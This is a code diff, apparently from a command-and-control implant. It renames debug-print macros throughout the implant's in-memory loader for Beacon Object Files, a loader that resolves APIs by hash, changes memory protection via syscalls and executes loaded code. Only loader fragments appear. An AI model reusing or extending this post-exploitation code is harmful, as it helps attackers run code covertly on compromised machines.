@@ -111,7 +111,7 @@ BOOL CoffeeProcessSymbol( PCOFFEE Coffee, LPSTR SymbolName, UINT16 SymbolType, P
 
             if ( HashStringA( SymFunction ) == BeaconApi[ i ].NameHash )
             {
-                //PUTS( "Found Beacon api function" )
+                //STUP( "Found Beacon api function" )
                 *pFuncAddr = BeaconApi[ i ].Pointer;
                 return TRUE;
             }
@@ -248,7 +248,7 @@ VOID CoffeeFunction( PVOID Address, PVOID Argument, SIZE_T Size )
     // Execute our function
     Function( Argument, Size );
 
-    PUTS( "Finished" )
+    STUP( "Finished" )
 }
 
 BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE_T Size, UINT32 RequestID )
@@ -263,7 +263,7 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
 
     if ( Instance->Config.Implant.CoffeeVeh )
     {
-        PUTS( "Register VEH handler..." )
+        STUP( "Register VEH handler..." )
         // Add Veh Debugger in case that our BOF crashes etc.
         VehHandle = Instance->Win32.RtlAddVectoredExceptionHandler( 1, &VehDebugger );
         if ( ! VehHandle )
@@ -308,7 +308,7 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
             Success = MmVirtualProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->SecMap[ SectionCnt ].Ptr, Coffee->SecMap[ SectionCnt ].Size, Protection );
             if ( ! Success )
             {
-                PUTS( "Failed to protect memory" )
+                STUP( "Failed to protect memory" )
                 return FALSE;
             }
         }
@@ -320,7 +320,7 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
         Success = MmVirtualProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->FunMap, Coffee->FunMapSize, PAGE_READONLY );
         if ( ! Success )
         {
-            PUTS( "Failed to protect memory" )
+            STUP( "Failed to protect memory" )
             return FALSE;
         }
     }
@@ -380,7 +380,7 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
         return FALSE;
     }
 
-    PUTS( "[*] Execute coffee main\n" );
+    STUP( "[*] Execute coffee main\n" );
     CoffeeFunction( CoffeeMain, Argument, Size );
 
     // Remove our exception handler
@@ -422,7 +422,7 @@ VOID CoffeeCleanup( PCOFFEE Coffee )
 // Process sections relocation and symbols
 BOOL CoffeeProcessSections( PCOFFEE Coffee )
 {
-    PUTS( "Process Sections" )
+    STUP( "Process Sections" )
     PVOID  FuncPtr           = NULL;
     DWORD  FuncCount         = 0;
     UINT64 OffsetLong        = 0;
@@ -666,7 +666,7 @@ VOID RemoveCoffeeFromInstance( PCOFFEE Coffee )
         Entry = Entry->Next;
     }
 
-    PUTS( "Coffe entry was not found" )
+    STUP( "Coffe entry was not found" )
 }
 
 VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize, UINT32 RequestID )
@@ -679,7 +679,7 @@ VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize
 
     if ( ! CoffeeData )
     {
-        PUTS( "[!] Coffee data is empty" );
+        STUP( "[!] Coffee data is empty" );
         goto END;
     }
 
@@ -702,7 +702,7 @@ VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize
 
     if ( Coffee->Header->Machine != IMAGE_FILE_MACHINE_AMD64 )
     {
-        PUTS( "The BOF is not AMD64" );
+        STUP( "The BOF is not AMD64" );
         goto END;
     }
 
@@ -710,7 +710,7 @@ VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize
 
     if ( Coffee->Header->Machine == IMAGE_FILE_MACHINE_AMD64 )
     {
-        PUTS( "The BOF is AMD64" );
+        STUP( "The BOF is AMD64" );
         goto END;
     }
 
@@ -721,7 +721,7 @@ VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize
 
     if ( ! Coffee->SecMap )
     {
-        PUTS( "Failed to allocate memory" )
+        STUP( "Failed to allocate memory" )
         goto END;
     }
 
@@ -739,7 +739,7 @@ VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize
     Coffee->ImageBase = MmVirtualAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), Coffee->BofSize, PAGE_READWRITE );
     if ( ! Coffee->ImageBase )
     {
-        PUTS( "Failed to allocate memory for the BOF" )
+        STUP( "Failed to allocate memory for the BOF" )
         goto END;
     }
 
@@ -763,14 +763,14 @@ VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize
 
     if ( ! CoffeeProcessSections( Coffee ) )
     {
-        PUTS( "[*] Failed to process relocation" );
+        STUP( "[*] Failed to process relocation" );
         goto END;
     }
 
     Success = CoffeeExecuteFunction( Coffee, EntryName, ArgData, ArgSize, RequestID );
 
 END:
-    PUTS( "[*] Cleanup memory" );
+    STUP( "[*] Cleanup memory" );
     CoffeeCleanup( Coffee );
 
     if ( Success )
